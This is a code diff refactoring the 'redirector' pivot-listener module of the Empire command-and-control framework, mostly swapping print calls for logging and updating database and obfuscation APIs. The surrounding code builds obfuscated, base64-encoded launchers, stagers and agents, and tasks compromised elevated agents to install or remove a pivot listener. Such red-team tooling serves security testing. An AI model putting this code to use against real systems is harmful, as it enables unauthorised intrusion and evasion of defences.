@@ -1,30 +1,41 @@
-from __future__ import print_function
-
 import base64
 import copy
+import logging
 import os
 import random
 from builtins import object, str
-from typing import List
+from typing import List, Optional, Tuple
 
 from empire.server.common import encryption, helpers, packets, templating
-from empire.server.database import models
-from empire.server.database.base import Session
+from empire.server.common.empire import MainMenu
+from empire.server.core.db.base import SessionLocal
 from empire.server.utils import data_util, listener_util
+
+LOG_NAME_PREFIX = __name__
+log = logging.getLogger(__name__)
 
 
 class Listener(object):
-    def __init__(self, mainMenu, params=[]):
+    def __init__(self, mainMenu: MainMenu, params=[]):
 
         self.info = {
             "Name": "redirector",
-            "Author": ["@xorrior"],
+            "Authors": [
+                {
+                    "Name": "Chris Ross",
+                    "Handle": "@xorrior",
+                    "Link": "https://twitter.com/xorrior",
+                }
+            ],
             "Description": (
                 "Internal redirector listener. Active agent required. Listener options will be copied from another existing agent. Requires the active agent to be in an elevated context."
             ),
             # categories - client_server, peer_to_peer, broadcast, third_party
             "Category": ("peer_to_peer"),
             "Comments": [],
+            "Software": "",
+            "Techniques": [],
+            "Tactics": [],
         }
 
         # any options needed by the stager, settable during runtime
@@ -57,40 +68,27 @@ class Listener(object):
         self.mainMenu = mainMenu
         self.threads = {}  # used to keep track of any threaded instances of this server
 
-        # optional/specific for this module
-
-        # set the default staging key to the controller db default
-        # self.options['StagingKey']['Value'] = str(helpers.get_config('staging_key')[0])
+        self.instance_log = log
 
     def default_response(self):
         """
         If there's a default response expected from the server that the client needs to ignore,
         (i.e. a default HTTP page), put the generation here.
         """
-        print(
-            helpers.color("[!] default_response() not implemented for pivot listeners")
-        )
+        self.instance_log.info("default_response() not implemented for pivot listeners")
         return b""
 
-    def validate_options(self):
+    def validate_options(self) -> Tuple[bool, Optional[str]]:
         """
         Validate all options for this listener.
         """
-
-        for key in self.options:
-            if self.options[key]["Required"] and (
-                str(self.options[key]["Value"]).strip() == ""
-            ):
-                print(helpers.color('[!] Option "%s" is required.' % (key)))
-                return False
-
-        return True
+        return True, None
 
     def generate_launcher(
         self,
         encode=True,
         obfuscate=False,
-        obfuscationCommand="",
+        obfuscation_command="",
         userAgent="default",
         proxy="default",
         proxyCreds="default",
@@ -106,19 +104,19 @@ class Listener(object):
         bypasses = [] if bypasses is None else bypasses
 
         if not language:
-            print(
-                helpers.color(
-                    "[!] listeners/template generate_launcher(): no language specified!"
-                )
-            )
+            log.error("listeners/template generate_launcher(): no language specified!")
             return None
 
-        if listenerName and (listenerName in self.mainMenu.listeners.activeListeners):
-
+        # Previously, we had to do a lookup for the listener and check through threads on the instance.
+        # Beginning in 5.0, each instance is unique, so using self should work. This code could probably be simplified
+        # further, but for now keeping as is since 5.0 has enough rewrites as it is.
+        if (
+            True
+        ):  # The true check is just here to keep the indentation consistent with the old code.
+            active_listener = self
             # extract the set options for this instantiated listener
-            listenerOptions = self.mainMenu.listeners.activeListeners[listenerName][
-                "options"
-            ]
+            listenerOptions = active_listener.options
+
             host = listenerOptions["Host"]["Value"]
             launcher = listenerOptions["Launcher"]["Value"]
             stagingKey = listenerOptions["StagingKey"]["Value"]
@@ -250,14 +248,13 @@ class Listener(object):
                 stager = data_util.ps_convert_to_oneliner(stager)
 
                 if obfuscate:
-                    stager = data_util.obfuscate(
-                        self.mainMenu.installPath,
+                    stager = self.mainMenu.obfuscationv2.obfuscate(
                         stager,
-                        obfuscationCommand=obfuscationCommand,
+                        obfuscation_command=obfuscation_command,
                     )
                 # base64 encode the stager and return it
                 if encode and (
-                    (not obfuscate) or ("launcher" not in obfuscationCommand.lower())
+                    (not obfuscate) or ("launcher" not in obfuscation_command.lower())
                 ):
                     return helpers.powershell_launcher(stager, launcher)
                 else:
@@ -276,8 +273,8 @@ class Listener(object):
                     if safeChecks.lower() == "true":
                         launcherBase += listener_util.python_safe_checks()
                 except Exception as e:
-                    p = "[!] Error setting LittleSnitch in stager: " + str(e)
-                    print(helpers.color(p, color="red"))
+                    p = f"{listenerName}: Error setting LittleSnitch in stager: {str(e)}"
+                    log.error(p, exc_info=True)
 
                 if userAgent.lower() == "default":
                     profile = listenerOptions["DefaultProfile"]["Value"]
@@ -394,9 +391,11 @@ class Listener(object):
                     .replace("{{ REPLACE_LOSTLIMIT }}", str(lostLimit))
                 )
 
-                compiler = self.mainMenu.loadedPlugins.get("csharpserver")
+                compiler = self.mainMenu.pluginsv2.get_by_id("csharpserver")
                 if not compiler.status == "ON":
-                    print(helpers.color("[!] csharpserver plugin not running"))
+                    self.instance_log.error(
+                        f"{listenerName} csharpserver plugin not running"
+                    )
                 else:
                     file_name = compiler.do_send_stager(
                         stager_yaml, "Sharpire", confuse=obfuscate
@@ -404,18 +403,9 @@ class Listener(object):
                     return file_name
 
             else:
-                print(
-                    helpers.color(
-                        "[!] listeners/template generate_launcher(): invalid language specification: only 'powershell' and 'python' are current supported for this module."
-                    )
+                log.error(
+                    "listeners/template generate_launcher(): invalid language specification: only 'powershell' and 'python' are current supported for this module."
                 )
-
-        else:
-            print(
-                helpers.color(
-                    "[!] listeners/template generate_launcher(): invalid listener name specification!"
-                )
-            )
 
     def generate_stager(
         self,
@@ -423,7 +413,7 @@ class Listener(object):
         encode=False,
         encrypt=True,
         obfuscate=False,
-        obfuscationCommand="",
+        obfuscation_command="",
         language=None,
     ):
         """
@@ -431,11 +421,7 @@ class Listener(object):
         implemented to return the stage1 key-negotiation stager code.
         """
         if not language:
-            print(
-                helpers.color(
-                    "[!] listeners/http generate_stager(): no language specified!"
-                )
-            )
+            log.error("listeners/http generate_stager(): no language specified!")
             return None
 
         profile = listenerOptions["DefaultProfile"]["Value"]
@@ -473,8 +459,7 @@ class Listener(object):
             stager = template.render(template_options)
 
             # Get the random function name generated at install and patch the stager with the proper function name
-            stager = data_util.keyword_obfuscation(stager)
-
+            stager = self.mainMenu.obfuscationv2.obfuscate_keywords(stager)
             # make sure the server ends with "/"
             if not host.endswith("/"):
                 host += "/"
@@ -496,10 +481,9 @@ class Listener(object):
             unobfuscated_stager = listener_util.remove_lines_comments(stager)
 
             if obfuscate:
-                unobfuscated_stager = data_util.obfuscate(
-                    self.mainMenu.installPath,
+                unobfuscated_stager = self.mainMenu.obfuscationv2.obfuscate(
                     unobfuscated_stager,
-                    obfuscationCommand=obfuscationCommand,
+                    obfuscation_command=obfuscation_command,
                 )
             # base64 encode the stager and return it
             if encode:
@@ -543,10 +527,8 @@ class Listener(object):
                 return stager
 
         else:
-            print(
-                helpers.color(
-                    "[!] listeners/http generate_stager(): invalid language specification, only 'powershell' and 'python' are currently supported for this module."
-                )
+            log.error(
+                "listeners/http generate_stager(): invalid language specification, only 'powershell' and 'python' are currently supported for this module."
             )
 
     def generate_agent(
@@ -554,7 +536,7 @@ class Listener(object):
         listenerOptions,
         language=None,
         obfuscate=False,
-        obfuscationCommand="",
+        obfuscation_command="",
         version="",
     ):
         """
@@ -562,11 +544,7 @@ class Listener(object):
         implemented to return the actual staged agent code.
         """
         if not language:
-            print(
-                helpers.color(
-                    "[!] listeners/http generate_agent(): no language specified!"
-                )
-            )
+            log.error("listeners/http generate_agent(): no language specified!")
             return None
 
         language = language.lower()
@@ -583,7 +561,7 @@ class Listener(object):
             with open(self.mainMenu.installPath + "/data/agent/agent.ps1") as f:
                 code = f.read()
             # Get the random function name generated at install and patch the stager with the proper function name
-            code = data_util.keyword_obfuscation(code)
+            code = self.mainMenu.obfuscationv2.obfuscate_keywords(code)
 
             # strip out comments and blank lines
             code = helpers.strip_powershell_comments(code)
@@ -607,10 +585,9 @@ class Listener(object):
                     "$KillDate,", "$KillDate = '" + str(killDate) + "',"
                 )
             if obfuscate:
-                code = data_util.obfuscate(
-                    self.mainMenu.installPath,
+                code = self.mainMenu.obfuscationv2.obfuscate(
                     code,
-                    obfuscationCommand=obfuscationCommand,
+                    obfuscation_command=obfuscation_command,
                 )
             return code
 
@@ -652,10 +629,8 @@ class Listener(object):
             code = ""
             return code
         else:
-            print(
-                helpers.color(
-                    "[!] listeners/http generate_agent(): invalid language specification, only 'powershell' and 'python' are currently supported for this module."
-                )
+            log.error(
+                "listeners/http generate_agent(): invalid language specification, only 'powershell' and 'python' are currently supported for this module."
             )
 
     def generate_comms(self, listenerOptions, language=None):
@@ -702,17 +677,11 @@ class Listener(object):
                 return comms
 
             else:
-                print(
-                    helpers.color(
-                        "[!] listeners/http generate_comms(): invalid language specification, only 'powershell' and 'python' are currently supported for this module."
-                    )
+                log.error(
+                    "listeners/http generate_comms(): invalid language specification, only 'powershell' and 'python' are currently supported for this module."
                 )
         else:
-            print(
-                helpers.color(
-                    "[!] listeners/http generate_comms(): no language specified!"
-                )
-            )
+            log.error("listeners/http generate_comms(): no language specified!")
 
     def start(self, name=""):
         """
@@ -728,17 +697,12 @@ class Listener(object):
             # check if a listener for the agent already exists
 
             if self.mainMenu.listeners.is_listener_valid(tempOptions["Name"]["Value"]):
-                print(
-                    helpers.color(
-                        "[!] Pivot listener already exists on agent %s"
-                        % (tempOptions["Name"]["Value"])
-                    )
+                log.error(
+                    f"{listenerName}: Pivot listener already exists on agent {tempOptions['Name']['Value']}"
                 )
                 return False
 
-            listenerOptions = self.mainMenu.listeners.activeListeners[listenerName][
-                "options"
-            ]
+            listenerOptions = self.options
             sessionID = self.mainMenu.agents.get_agent_id_db(
                 tempOptions["Name"]["Value"]
             )
@@ -854,9 +818,12 @@ class Listener(object):
                     if "Host" not in list(self.options.keys()):
                         self.options["Host"]["Value"] = host
 
-                    self.mainMenu.agents.add_agent_task_db(
-                        tempOptions["Name"]["Value"], "TASK_SHELL", script
-                    )
+                    with SessionLocal.begin() as db:
+                        agent = self.mainMenu.agentsv2.get_by_id(
+                            db, tempOptions["Name"]["Value"]
+                        )
+                        self.mainMenu.agenttasksv2.create_task_shell(db, agent, script)
+
                     msg = "Tasked agent to install Pivot listener "
                     self.mainMenu.agents.save_agent_log(
                         tempOptions["Name"]["Value"], msg
@@ -872,23 +839,17 @@ class Listener(object):
                     script = """
                     """
 
-                    print(helpers.color("[!] Python pivot listener not implemented"))
+                    log.error("Python pivot listener not implemented")
                     return False
 
                 else:
-                    print(
-                        helpers.color(
-                            "[!] Unable to determine the language for the agent"
-                        )
-                    )
+                    log.error("Unable to determine the language for the agent")
 
             else:
                 if not isElevated:
-                    print(
-                        helpers.color("[!] Agent must be elevated to run a redirector")
-                    )
+                    log.error("Agent must be elevated to run a redirector")
                 else:
-                    print(helpers.color("[!] Agent is not present in the cache"))
+                    log.error("Agent is not present in the cache")
                 return False
 
     def shutdown(self, name=""):
@@ -897,11 +858,12 @@ class Listener(object):
         named listener here.
         """
         if name and name != "":
-            print(helpers.color("[!] Killing listener '%s'" % (name)))
+            self.instance_log.info(f"{name}: shutting down...")
+            log.info(f"{name}: shutting down...")
 
             sessionID = self.mainMenu.agents.get_agent_id_db(name)
             isElevated = self.mainMenu.agents.is_agent_elevated(sessionID)
-            if self.mainMenu.agents.is_agent_present(name) and isElevated:
+            if self.mainMenu.agents.is_agent_present(sessionID) and isElevated:
 
                 if self.mainMenu.agents.get_language_db(sessionID).startswith("po"):
 
@@ -978,21 +940,16 @@ class Listener(object):
                     script += " -Reset"
                     script += " -FirewallName %s" % (sessionID)
 
-                    self.mainMenu.agents.add_agent_task_db(
-                        sessionID, "TASK_SHELL", script
-                    )
+                    with SessionLocal.begin() as db:
+                        agent = self.mainMenu.agentsv2.get_by_id(db, sessionID)
+                        self.mainMenu.agenttasksv2.create_task_shell(db, agent, script)
                     msg = "Tasked agent to uninstall Pivot listener "
                     self.mainMenu.agents.save_agent_log(sessionID, msg)
 
                 elif self.mainMenu.agents.get_language_db(sessionID).startswith("py"):
-
-                    print(helpers.color("[!] Shutdown not implemented for python"))
+                    log.error("Shutdown not implemented for python")
 
             else:
-                print(
-                    helpers.color(
-                        "[!] Agent is not present in the cache or not elevated"
-                    )
-                )
+                log.error("Agent is not present in the cache or not elevated")
 
         pass
